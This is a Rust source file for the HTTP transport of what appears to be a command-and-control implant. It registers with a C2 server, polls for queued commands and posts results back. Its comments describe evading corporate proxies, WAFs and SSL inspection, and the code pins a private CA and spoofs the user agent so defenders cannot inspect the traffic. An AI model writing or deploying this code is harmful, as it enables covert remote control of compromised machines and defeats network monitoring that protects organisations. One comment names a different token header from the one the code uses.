// src/agent/http_transport.rs
//
// Agent-side HTTP(S) transport. Instead of maintaining a persistent TCP
// connection, the agent polls the C2 server via standard HTTP requests.
// This allows traffic to traverse corporate proxies, WAFs, and SSL
// inspection appliances.
//
// Flow:
//   1. POST /register with ClientHello → receive session token
//   2. Loop:
//      a. GET /<poll_uri> with token in X-Request-ID header → receive commands
//      b. Process commands
//      c. POST /<result_uri> with results in body
//      d. Sleep

use reqwest::{Client, Proxy};
use serde::Deserialize;

use crate::common::{C2Config, ClientHello, SecuredCommand, CommandResponse};

/// Build an HTTP client with proxy, TLS pinning, and settings from the config.
pub fn build_client(config: &C2Config) -> Result<Client, String> {
    // Pin to the build-time CA certificate instead of accepting any cert.
    // This prevents SSL-inspecting firewalls and MITM attackers from
    // intercepting C2 traffic, even with self-signed infrastructure.
    let ca_pem = include_bytes!("../../certs/ca.crt");
    let ca_cert = reqwest::Certificate::from_pem(ca_pem)
        .map_err(|e| format!("Failed to parse embedded CA cert: {}", e))?;

    let mut builder = Client::builder()
        .add_root_certificate(ca_cert)
        .tls_built_in_root_certs(false) // Only trust our pinned CA, not the system store
        .timeout(std::time::Duration::from_secs(30))
        .connect_timeout(std::time::Duration::from_secs(15));

    // User-Agent from malleable profile
    if !config.profile.user_agent.is_empty() {
        builder = builder.user_agent(&config.profile.user_agent);
    }

    // Proxy configuration
    let proxy = &config.proxy;
    if !proxy.url.is_empty() {
        // Explicit proxy
        let mut p = Proxy::all(&proxy.url).map_err(|e| format!("Proxy URL: {}", e))?;
        if !proxy.username.is_empty() {
            p = p.basic_auth(&proxy.username, &proxy.password);
        }
        builder = builder.proxy(p);
    } else if !proxy.use_system {
        // Explicitly no proxy
        builder = builder.no_proxy();
    }
    // If use_system is true and url is empty, reqwest uses system proxy by default

    builder.build().map_err(|e| format!("HTTP client: {}", e))
}

/// The base URL for the C2 server.
pub fn base_url(config: &C2Config) -> String {
    let scheme = if config.transport == crate::common::TransportProtocol::Https {
        "https"
    } else {
        "http"
    };
    format!("{}://{}:{}", scheme, config.c2_host, config.tunnel_port)
}

/// Register with the C2 server. Returns the session token.
pub async fn register(client: &Client, base: &str, hello: &ClientHello) -> Result<(String, Vec<SecuredCommand>), String> {
    let url = format!("{}/register", base);
    let resp = client.post(&url)
        .json(hello)
        .send()
        .await
        .map_err(|e| format!("Register: {}", e))?;

    if !resp.status().is_success() {
        return Err(format!("Register failed: HTTP {}", resp.status()));
    }

    #[derive(Deserialize)]
    struct RegisterResponse {
        token: String,
        #[serde(default)]
        commands: Vec<SecuredCommand>,
    }

    let data: RegisterResponse = resp.json().await.map_err(|e| format!("Parse: {}", e))?;
    Ok((data.token, data.commands))
}

/// Poll for commands. Returns any queued commands.
pub async fn poll(client: &Client, base: &str, token: &str, profile_uri: &str) -> Result<Vec<SecuredCommand>, String> {
    let url = format!("{}{}", base, profile_uri);
    let resp = client.get(&url)
        .header("X-Session-Token", token)
        .send()
        .await
        .map_err(|e| format!("Poll: {}", e))?;

    if !resp.status().is_success() {
        return Err(format!("Poll: HTTP {}", resp.status()));
    }

    let body = resp.text().await.map_err(|e| format!("Body: {}", e))?;
    if body.trim().is_empty() || body.contains("\"data\":[]") {
        return Ok(Vec::new());
    }

    serde_json::from_str::<Vec<SecuredCommand>>(&body)
        .map_err(|e| format!("Parse commands: {}", e))
}

/// Send a command response back to the server.
pub async fn send_result(client: &Client, base: &str, token: &str, resp: &CommandResponse, profile_uri: &str) -> Result<(), String> {
    let url = format!("{}{}", base, profile_uri);
    client.post(&url)
        .header("X-Session-Token", token)
        .json(resp)
        .send()
        .await
        .map_err(|e| format!("Send result: {}", e))?;
    Ok(())
}
